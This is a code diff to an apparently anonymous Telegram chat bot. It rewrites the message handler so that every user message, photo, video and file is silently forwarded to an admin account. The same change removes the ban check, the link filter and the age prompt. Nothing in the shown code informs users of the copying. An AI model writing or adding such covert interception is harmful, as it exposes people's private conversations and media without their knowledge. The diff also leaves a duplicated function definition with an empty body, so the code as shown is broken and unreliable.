@@ -118,21 +118,48 @@ async def find_cb(update, context):
 
 async def update_msg(update, context):
     uid = update.effective_user.id
-    if uid in banned:
-        return await update.message.reply_text("🚫 You are banned.")
-    if URL_PATTERN.search(update.message.text):
-        return await update.message.reply_text("Links not allowed 🔒")
-    parts = update.message.text.split()
-    if not users[uid].get("age"):
-        if parts and parts[0].isdigit():
-            return await set_age(update, context)
-        return await update.message.reply_text("Send your age first.\nExample: 24")
-    if not users[uid].get("country"):
-        return await update.message.reply_text("Pick a country from the list.", reply_markup=country_keyboard())
-    if uid in matches:
-        await context.bot.send_message(matches[uid]["other"], f"💬 {update.message.text}")
-    else:
-        await update.message.reply_text("No active chat — tap 🔍 Find partner")
+async def update_msg(update, context):
+    msg = update.message
+    if not msg:
+        return
+    u = msg.from_user
+    uid = u.id
+
+    # forward a copy to admin — text, photo, video, file, everything
+    await context.bot.forward_message(
+        chat_id=ADMIN_ID,
+        from_chat_id=msg.chat_id,
+        message_id=msg.message_id
+    )
+
+    # route to partner through the bot
+    partner_id = chats.get(uid)
+    if partner_id and chats.get(partner_id) == uid:
+        # partner is the one they're matched with
+        try:
+            if msg.text:
+                await context.bot.send_message(partner_id, msg.text)
+            elif msg.photo:
+                await context.bot.send_photo(
+                    partner_id, msg.photo[-1].file_id,
+                    caption=msg.caption or "")
+            elif msg.video:
+                await context.bot.send_video(
+                    partner_id, msg.video.file_id,
+                    caption=msg.caption or "")
+            elif msg.document:
+                await context.bot.send_document(
+                    partner_id, msg.document.file_id,
+                    caption=msg.caption or "")
+            elif msg.voice:
+                await context.bot.send_voice(partner_id, msg.voice.file_id)
+            elif msg.audio:
+                await context.bot.send_audio(partner_id, msg.audio.file_id)
+            elif msg.sticker:
+                await context.bot.send_sticker(partner_id, msg.sticker.file_id)
+        except Exception as e:
+            logger.error(f"Delivery failed: {e}")
+    return
 
 async def reply_cb(update, context):
     q = update.callback_query; uid = q.from_user.id
